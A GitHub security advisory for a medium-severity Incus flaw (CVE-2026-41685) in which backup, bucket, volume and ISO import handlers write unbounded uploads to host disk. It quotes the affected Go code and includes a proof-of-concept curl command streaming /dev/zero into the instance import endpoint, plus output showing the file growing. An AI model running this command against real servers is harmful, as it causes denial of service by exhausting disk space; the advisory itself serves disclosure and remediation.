# [M] Incus is affected by unbounded binary import disk exhaustion

## Summary
Severity: Medium
Advisory: GHSA-98vh-x9cx-9cfp
CVE: CVE-2026-41685
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-98vh-x9cx-9cfp
Type: github-advisory

## Affected
- Go: `github.com/lxc/incus/v6/cmd/incusd` — affected >=0

## Details
### Summary
Uploads of large amount of data by authenticated users can run the Incus server out of disk space, potentially taking down the host system.

The impact here is limited for anyone using `storage.images_volume` and `storage.backups_volume` as those users will have large uploads be stored on those volumes rather than directly on the host filesystem. This is the default behavior on IncusOS.

### Details
Multiple binary import paths accept application/octet-stream requests and stream the HTTP request body directly into temporary files on the host without any visible request-size limit on the upload path.

When these endpoints receive binary content, the daemon routes the request body into import routines that create temporary files under daemon-controlled host storage locations and copy the full attacker-controlled stream into them using direct io.Copy operations. This write occurs before the uploaded content is fully parsed and before later validation can reject the import.

Because no visible http.MaxBytesReader, io.LimitReader, quota-aware wrapper, or equivalent size-enforcement mechanism is present around these upload paths, an authenticated attacker can supply an arbitrarily large continuous stream of data. This causes the daemon to keep writing unbounded input to host storage until the operation fails or the underlying file system is exhausted. In a multi-tenant deployment, this can be used to consume shared disk space and cause denial of service on the node.

The binary import handlers are reachable through application/octet-stream request paths in the instance backup import, storage bucket import, and storage volume import flows, where the request body is passed directly into import helpers handling backup and ISO uploads.

Affected File:
https://github.com/lxc/incus/blob/v6.22.0/cmd/incusd/instances_post.go 

Affected Code:
```
func createFromBackup(s *state.State, r *http.Request, projectName string, data io.Reader, pool string, instanceName string, config string, device string) response.Response {
    reverter := revert.New()
    defer reverter.Fail()

    // Create temporary file to store uploaded backup data.
    backupFile, err := os.CreateTemp(internalUtil.VarPath("backups"), fmt.Sprintf("%s_", backup.WorkingDirPrefix))
    if err != nil {
        return response.InternalError(err)
    }

    defer func() { _ = os.Remove(backupFile.Name()) }()
    reverter.Add(func() { _ = backupFile.Close() })

    // Stream uploaded backup data into temporary file.
    _, err = io.Copy(backupFile, data)
    if err != nil {
        return response.InternalError(err)
    }
    [...]
}
```

Affected File:
https://github.com/lxc/incus/blob/v6.22.0/cmd/incusd/storage_buckets.go 

Affected Code:
```
func createStoragePoolBucketFromBackup(s *state.State, r *http.Request, requestProjectName string, projectName string, data io.Reader, pool string, bucketName string) response.Response {
    [...]
    backupFile, err := os.CreateTemp(internalUtil.VarPath("backups"), fmt.Sprintf("%s_", backup.WorkingDirPrefix))
    [...]
    _, err = io.Copy(backupFile, data)
    [...]
}
```

Affected File:
https://github.com/lxc/incus/blob/v6.22.0/cmd/incusd/storage_volumes.go 

Affected Code:
```
func createStoragePoolVolumeFromBackup(s *state.State, r *http.Request, requestProjectName string, projectName string, data io.Reader, pool string, volName string) response.Response {
    [...]
    backupFile, err := os.CreateTemp(internalUtil.VarPath("backups"), fmt.Sprintf("%s_", backup.WorkingDirPrefix))
    [...]
    _, err = io.Copy(backupFile, data)
    [...]
}

[...]

func createStoragePoolVolumeFromISO(s *state.State, r *http.Request, requestProjectName string, projectName string, data io.Reader, pool string, volName string) response.Response {
    [...]
    isoFile, err := os.CreateTemp(internalUtil.VarPath("isos"), fmt.Sprintf("%s_", "incus_iso"))
    [...]
    size, err := io.Copy(isoFile, data)
    [...]
}
```

### PoC
The following PoC demonstrates one reachable instance of this issue through the instance import endpoint. The same unbounded upload-to-tempfile pattern is also present in storage bucket backup import, storage volume backup import, and storage volume ISO import handlers.

Step 1: Trigger the sustained upload stream

From an Incus client with access to the target server, open a long-lived application/octet-stream upload and continuously stream null bytes into the instance import endpoint. Using timeout 120 limits the reproduction to two minutes while still demonstrating that the daemon keeps writing attacker-controlled input for as long as the connection remains open.

Commands:
```
echo "[*] Initiating a 2-minute sustained disk exhaustion attack..."

timeout 120 cat /dev/zero | curl -k -X POST \
  --cert ~/.config/incus/client.crt \
  --key ~/.config/incus/client.key \
  "https://7atest.dev.stgraber.org:443/1.0/instances?project=default" \
  -H "Content-Type: application/octet-stream" \
  -T -
```

Step 2: Verify host-side disk growth during the upload

On the Incus host, observe the temporary backup file being actively written under the backups directory while the client keeps the stream open.

Command:
```
watch -n 1 "ls -lh /var/lib/incus/backups/"
```

Result:
```
total 100M
drwx------ 2 root root 4.0K Mar  1 22:44 custom
-rw------- 1 root root 100M Mar 23 10:46 incus_backup_2743299426
drwx------ 2 root root 4.0K Mar  1 22:44 instances

total 106M
drwx------ 2 root root 4.0K Mar  1 22:44 custom
-rw------- 1 root root 106M Mar 23 10:46 incus_backup_2743299426
drwx------ 2 root root 4.0K Mar  1 22:44 instances

total 110M
drwx------ 2 root root 4.0K Mar  1 22:44 custom
-rw------- 1 root root 110M Mar 23 10:46 incus_backup_2743299426
drwx------ 2 root root 4.0K Mar  1 22:44 instances

total 113M
drwx------ 2 root root 4.0K Mar  1 22:44 custom
-rw------- 1 root root 113M Mar 23 10:46 incus_backup_2743299426
drwx------ 2 root root 4.0K Mar  1 22:44 instances
```

Step 3: Observe post-stream failure behavior

When the client-side timeout expires, the upload is interrupted locally and the stream stops. In this reproduction, that means the process is terminated before any later import-stage error is surfaced back to the client. This does not mitigate the issue during the active upload window, because io.Copy continues writing to disk for as long as the attacker keeps the stream open.

It is recommended to enforce a maximum request size or quota-aware upload limit in the affected binary import paths before any data is written to disk. The incoming request body should be wrapped with http.MaxBytesReader, io.LimitReader, or an equivalent quota-aware mechanism so that oversized uploads fail safely before consuming unbounded host storage. By contrast, other upload flows such as image upload appear to use internalIO.NewQuotaWriter(..., budget) when persisting request data, but no analogous quota enforcement is visible in the affected binary import handlers.

A patch is available at https://github.com/lxc/incus/releases/tag/v7.0.0.

### Credit
This issue was discovered and reported by the team at 7asecurity (https://7asecurity.com/)

## References
- https://github.com/lxc/incus/security/advisories/GHSA-98vh-x9cx-9cfp
- https://nvd.nist.gov/vuln/detail/CVE-2026-41685
- https://github.com/lxc/incus
- https://github.com/lxc/incus/releases/tag/v7.0.0
